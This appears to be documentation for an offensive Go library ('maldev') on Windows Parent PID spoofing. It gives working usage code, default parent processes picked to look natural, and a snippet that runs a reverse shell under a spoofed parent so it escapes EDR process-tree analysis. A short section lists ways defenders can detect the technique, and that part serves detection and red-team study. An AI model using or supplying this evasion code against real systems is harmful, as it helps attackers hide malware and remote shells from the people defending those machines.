---
last_reviewed: 2026-04-27
reflects_commit: a705c32
---

# PPID Spoofing

> **MITRE ATT&CK:** T1134.004 -- Access Token Manipulation: Parent PID Spoofing | **Detection:** Medium -- Process tree anomalies are detectable but require behavioral analysis

## Primer

When a process creates a child process on Windows, the child inherits its parent's identity in the process tree. Security tools use this parent-child relationship as a key detection signal. For example, if `cmd.exe` is spawned by `explorer.exe`, that looks normal -- the user opened a command prompt. But if `cmd.exe` is spawned by `excel.exe`, that is highly suspicious and likely indicates a macro-based attack.

PPID spoofing breaks this detection by lying about the parent. When creating a child process, we use the `PROC_THREAD_ATTRIBUTE_PARENT_PROCESS` attribute to specify a different parent process handle. The child process appears in the process tree as if it was spawned by the chosen parent (e.g., `explorer.exe` or `svchost.exe`), even though our process actually created it.

This is a legitimate Windows API feature -- Go 1.24+ even added native support via `syscall.SysProcAttr.ParentProcess`.

## How It Works

```mermaid
sequenceDiagram
    participant Attacker as Attacker (malware.exe)
    participant Explorer as explorer.exe (PID 1234)
    participant Kernel as Windows Kernel
    participant Child as cmd.exe (child)

    Attacker->>Kernel: OpenProcess(PROCESS_CREATE_PROCESS, explorer PID)
    Kernel-->>Attacker: hParent

    Note over Attacker: Build PROC_THREAD_ATTRIBUTE_LIST<br>with PARENT_PROCESS = hParent

    Attacker->>Kernel: CreateProcess(cmd.exe, EXTENDED_STARTUPINFO)
    Kernel->>Child: Create process
    Kernel-->>Child: ParentProcessId = 1234 (explorer)

    Note over Child: Process tree shows:<br>explorer.exe → cmd.exe<br>(not malware.exe → cmd.exe)
```

**Step-by-step:**

1. **Find target parent** -- Enumerate running processes to find a suitable legitimate parent (e.g., `explorer.exe`, `svchost.exe`).
2. **OpenProcess(PROCESS_CREATE_PROCESS)** -- Open the target with the minimum right needed for PPID spoofing.
3. **Build SysProcAttr** -- Set `ParentProcess` to the opened handle. Go 1.24+ handles the `PROC_THREAD_ATTRIBUTE_LIST` plumbing automatically.
4. **CreateProcess** -- Spawn the child process. Windows sets the child's `ParentProcessId` to the target, not the actual creator.

## Default Targets

maldev searches for these processes in order (first match wins):

| Process | Why |
|---------|-----|
| `explorer.exe` | Every interactive session has one. Most natural parent for user-facing apps. |
| `svchost.exe` | Dozens of instances. Services spawning children is normal. |
| `sihost.exe` | Shell Infrastructure Host. Present in every session. |
| `RuntimeBroker.exe` | UWP broker. Common, low-profile parent. |

## Usage

```go
package main

import (
    "fmt"
    "os/exec"

    "golang.org/x/sys/windows"

    "github.com/oioio-space/maldev/c2/shell"
)

func main() {
    spoofer := shell.NewPPIDSpoofer()

    if err := spoofer.FindTargetProcess(); err != nil {
        panic(err)
    }
    fmt.Printf("Spoofing parent to PID %d\n", spoofer.TargetPID())

    attr, parentHandle, err := spoofer.SysProcAttr()
    if err != nil {
        panic(err)
    }
    defer windows.CloseHandle(parentHandle)

    cmd := exec.Command("cmd.exe", "/c", "whoami")
    cmd.SysProcAttr = attr
    out, err := cmd.Output()
    if err != nil {
        panic(err)
    }
    fmt.Printf("Output: %s\n", out)
}
```

## Custom Targets

```go
// Target a specific process
spoofer := shell.NewPPIDSpooferWithTargets([]string{"winlogon.exe"})

if err := spoofer.FindTargetProcess(); err != nil {
    // winlogon.exe requires SeDebugPrivilege to open
    panic(err)
}
```

## Integration with Reverse Shell

The PPID spoofer integrates naturally with `c2/shell` for reverse shell scenarios:

```go
// The reverse shell can spawn under a spoofed parent,
// making the shell process appear as a child of explorer.exe
// in EDR process trees.
spoofer := shell.NewPPIDSpoofer()
spoofer.FindTargetProcess()
attr, handle, _ := spoofer.SysProcAttr()
defer windows.CloseHandle(handle)

cmd := exec.Command("cmd.exe")
cmd.SysProcAttr = attr
// ... bind to transport
```

## Advantages & Limitations

| Aspect | Detail |
|--------|--------|
| Stealth | Medium -- fools basic process tree analysis, but advanced EDR can correlate the real creator via ETW `ProcessStart` events or kernel callbacks. |
| Compatibility | Windows Vista+ (PROC_THREAD_ATTRIBUTE_PARENT_PROCESS). Go 1.24+ for native `SysProcAttr.ParentProcess`. |
| Privileges | `PROCESS_CREATE_PROCESS` on the target parent. For system processes (`winlogon.exe`, `lsass.exe`), `SeDebugPrivilege` is required. |
| Exploit Guard | Windows Exploit Guard / ASR rules can block PPID spoofing on hardened systems (Windows 10 22H2+). The test SKIPs in this case. |
| Scope | Only affects the parent PID in the process tree. The child still inherits the *creator's* token unless explicit token manipulation is also performed. |
| Go 1.24+ | Uses native `syscall.SysProcAttr.ParentProcess` -- no CGO, no manual attribute list management. |

## Detection

Defenders can detect PPID spoofing via:

1. **ETW ProcessStart events** -- The `CreatingProcessId` field in the kernel event shows the real creator, not the spoofed parent.
2. **Handle table analysis** -- The creator must have an open handle to the target parent with `PROCESS_CREATE_PROCESS`.
3. **Behavioral anomalies** -- A child process's token/session doesn't match the supposed parent's session.
4. **Sysmon Event ID 1** -- `ParentProcessId` vs `ParentProcessGuid` can reveal mismatches.

## API Reference

```go
// Create with default targets (explorer, svchost, sihost, RuntimeBroker)
spoofer := shell.NewPPIDSpoofer()

// Create with custom targets
spoofer := shell.NewPPIDSpooferWithTargets([]string{"explorer.exe", "notepad.exe"})

// Find a running target process
err := spoofer.FindTargetProcess()

// Get the selected PID
pid := spoofer.TargetPID()

// Get SysProcAttr for exec.Command -- caller must close handle
attr, parentHandle, err := spoofer.SysProcAttr()
defer windows.CloseHandle(parentHandle)

// Check actual parent PID of any process
ppid, err := shell.ParentPID(childPID)

// Check if current process is admin
admin := shell.IsAdmin()
```

## See also

- [Evasion area README](README.md)
- [`process` techniques (index)](../process/README.md) — sibling process-tampering primitives
- [`process/tamper/fakecmd`](../process/fakecmd.md) — companion lineage-spoof: pretty up the spawned child's CommandLine
